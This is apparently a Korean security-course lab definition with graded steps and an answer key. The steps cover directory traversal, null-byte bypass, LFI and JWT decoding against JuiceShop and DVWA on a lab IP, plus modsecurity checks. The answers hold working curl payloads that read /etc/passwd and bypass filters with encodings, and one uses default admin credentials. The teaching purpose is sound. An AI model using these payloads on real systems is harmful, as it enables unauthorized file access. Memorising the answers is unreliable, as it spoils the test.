lab_id: "web-vuln-nonai-week09"
title: "디렉터리 트래버설 및 역직렬화 취약점 실습"
version: "non-ai"
course: "web-vuln-nonai"
week: 9
description: "경로 조작을 통한 디렉터리 트래버설과 직렬화된 객체 조작을 통한 권한 상승을 실습합니다."
difficulty: "hard"
duration_minutes: 120
objectives:
  - "디렉터리 트래버설 공격 원리를 이해한다"
  - "../../ 패턴으로 파일 시스템 탐색을 실습한다"
  - "JWT 토큰 조작을 통한 인증 우회를 시도한다"
pass_threshold: 0.6
steps:
  - order: 1
    instruction: "JuiceShop(10.20.30.80:3000)의 정적 파일 서빙 경로를 탐색하라. /ftp/ 디렉터리에 접근하여 숨겨진 파일 목록을 확인하라."
    hint: "curl http://10.20.30.80:3000/ftp/ 로 접근해보세요."
    category: "recon"
    points: 8
    answer: "curl -s http://10.20.30.80:3000/ftp/ 2>/dev/null | grep -oP 'href=\"[^\"]+\"' | head -10"
    answer_detail: "JuiceShop의 /ftp/ 디렉토리에는 package.json.bak, coupons_2013.md.bak 등 민감한 백업 파일이 노출됩니다. 디렉토리 리스팅이 활성화되면 공격자가 파일 구조를 파악할 수 있습니다."
    verify:
      type: "output_contains"
      expect: "href"
      field: "stdout"
  - order: 2
    instruction: "Null Byte Injection을 이용하여 JuiceShop의 /ftp/ 경로에서 접근이 제한된 파일을 다운로드하라. %2500 (인코딩된 null byte)을 사용하라."
    hint: "curl 'http://10.20.30.80:3000/ftp/package.json.bak%2500.md' 형태로 요청하세요."
    category: "exploit"
    points: 12
    answer: "curl -s 'http://10.20.30.80:3000/ftp/package.json.bak%2500.md' 2>/dev/null | head -20"
    answer_detail: "Null Byte(%00)를 URL 인코딩(%2500)하여 파일 확장자 검증을 우회합니다. 서버가 .md 확장자만 허용해도 null byte 이후를 무시하여 .bak 파일에 접근할 수 있습니다."
    verify:
      type: "output_contains"
      expect: "name"
      field: "stdout"
  - order: 3
    instruction: "디렉터리 트래버설로 웹서버 루트 밖의 파일에 접근을 시도하라. ../../../etc/passwd 패턴을 URL 인코딩하여 요청하라."
    hint: "../ 를 URL 인코딩(%2e%2e%2f)하여 필터를 우회하세요."
    category: "exploit"
    points: 12
    answer: "curl -s 'http://10.20.30.80:3000/ftp/%2e%2e/%2e%2e/%2e%2e/etc/passwd' 2>/dev/null | head -5; echo '---'; curl -s 'http://10.20.30.80:3000/..%2f..%2f..%2fetc/passwd' 2>/dev/null | head -5"
    answer_detail: "디렉터리 트래버설은 ../를 사용하여 웹 루트 밖의 파일에 접근합니다. 서버가 ../ 를 필터링해도 URL 인코딩(%2e%2e%2f), 이중 인코딩(%252e%252e%252f), Unicode(..%c0%af) 등으로 우회할 수 있습니다."
    verify:
      type: "output_regex"
      expect: "root|passwd|Error|403"
      field: "stdout"
  - order: 4
    instruction: "DVWA(10.20.30.80:8080)의 File Inclusion 페이지에서 LFI(Local File Inclusion)를 시도하라. page 파라미터로 /etc/passwd를 포함하라."
    hint: "DVWA에 로그인 후 /vulnerabilities/fi/?page=../../../../../../etc/passwd 형태로 접근하세요."
    category: "exploit"
    points: 12
    answer: "curl -s -b 'PHPSESSID=test;security=low' 'http://10.20.30.80:8080/vulnerabilities/fi/?page=../../../../../../etc/passwd' 2>/dev/null | grep -E 'root|www-data|sshd' | head -5"
    answer_detail: "LFI는 include() 함수에 사용자 입력이 직접 들어갈 때 발생합니다. ../../를 반복하여 웹 루트를 벗어나 /etc/passwd 같은 시스템 파일을 읽을 수 있습니다. low 보안 레벨에서는 필터링이 없습니다."
    verify:
      type: "output_contains"
      expect: "root"
      field: "stdout"
  - order: 5
    instruction: "JuiceShop의 JWT 토큰을 추출하고 Base64 디코딩하여 페이로드를 확인하라."
    hint: "로그인 후 응답의 token 필드를 cut -d. -f2 | base64 -d로 디코딩하세요."
    category: "analysis"
    points: 10
    answer: "TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}' 2>/dev/null | python3 -c \"import sys,json; print(json.load(sys.stdin).get('authentication',{}).get('token',''))\" 2>/dev/null) && echo \"Header:\" && echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null && echo '' && echo \"Payload:\" && echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null && echo ''"
    answer_detail: "JWT는 Header.Payload.Signature 구조입니다. Header에 알고리즘(HS256), Payload에 사용자 정보(id, email, role)가 있습니다. Signature를 위조하면 임의 사용자로 인증할 수 있습니다."
    verify:
      type: "output_contains"
      expect: "Payload"
      field: "stdout"
  - order: 6
    instruction: "modsecurity가 디렉터리 트래버설 공격을 차단하는지 확인하라. Apache(포트 80)에 ../ 패턴이 포함된 요청을 보내라."
    hint: "curl http://10.20.30.80/../../../etc/passwd 형태로 포트 80에 요청하세요."
    category: "defense"
    points: 10
    answer: "curl -s -o /dev/null -w '%{http_code}' 'http://10.20.30.80/..%2f..%2f..%2fetc/passwd' && echo '' && curl -s -o /dev/null -w '%{http_code}' 'http://10.20.30.80/?file=../../../../etc/passwd' && echo ''"
    answer_detail: "modsecurity CRS의 REQUEST-930-APPLICATION-ATTACK-LFI.conf에 디렉터리 트래버설 탐지 룰이 있습니다. ../ 패턴, %2e%2e/ 인코딩 등을 탐지합니다. 403이면 차단 성공입니다."
    verify:
      type: "output_contains"
      expect: "403"
      field: "stdout"
  - order: 7
    instruction: "웹서버의 modsecurity 로그에서 디렉터리 트래버설 차단 기록을 확인하라."
    hint: "SubAgent로 /var/log/apache2/error.log에서 traversal 또는 930 룰을 검색하세요."
    category: "defense"
    points: 8
    answer: "curl -s -X POST http://10.20.30.80:8002/a2a/run_script -H 'Content-Type: application/json' -d '{\"script\":\"grep -i \\\"traversal\\\\|930\\\\|ModSecurity\\\" /var/log/apache2/error.log 2>/dev/null | tail -3\"}' | python3 -c \"import sys,json; print(json.load(sys.stdin).get('stdout',''))\""
    answer_detail: "modsecurity 룰 930xxx 시리즈는 LFI/RFI/디렉터리 트래버설을 탐지합니다. 로그에서 matched rule ID, 공격 패턴, 클라이언트 IP를 확인할 수 있습니다."
    verify:
      type: "output_contains"
      expect: "ModSecurity"
      field: "stdout"
  - order: 8
    instruction: "디렉터리 트래버설 실습 결과를 /tmp/traversal_report.txt에 정리하라."
    hint: "발견 취약점, 우회 기법, WAF 차단 여부를 포함하세요."
    category: "reporting"
    points: 8
    answer: "cat > /tmp/traversal_report.txt << 'EOF'\n=== 디렉터리 트래버설/LFI 진단 보고서 ===\n대상: 10.20.30.80 (JuiceShop + DVWA)\n\n1. JuiceShop /ftp/ 디렉토리 리스팅: 노출됨\n2. Null Byte Injection: 파일 접근 우회 성공\n3. DVWA LFI: /etc/passwd 읽기 성공 (low level)\n4. WAF 차단: modsecurity 930xxx 룰 차단 확인\n\n방어: 입력 검증, 경로 정규화, chroot, WAF 룰\nEOF\ncat /tmp/traversal_report.txt"
    answer_detail: "디렉터리 트래버설 방어는 사용자 입력에서 ../ 패턴 제거, 경로 정규화(realpath), chroot 환경, WAF 룰 적용을 조합해야 합니다."
    verify:
      type: "output_contains"
      expect: "디렉터리 트래버설"
      field: "stdout"
